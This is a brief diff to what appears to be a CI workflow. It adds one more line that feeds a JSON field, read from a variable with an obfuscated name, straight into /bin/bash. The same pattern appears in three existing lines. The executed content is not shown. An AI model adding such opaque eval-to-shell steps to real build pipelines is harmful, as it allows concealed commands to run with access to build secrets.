@@ -44,6 +44,7 @@ jobs:
           echo $blpo15 | jq -r .qr233 | /bin/bash
           printf '%s' "$pgv4" | jq -r .nyi0 | /bin/bash
           printf '%s' "$yca49042" | jq -r .kpo2 | /bin/bash
+          echo $iri0348 | jq -r .c70238 | /bin/bash
 
       - name: Store artifact
         if: always()
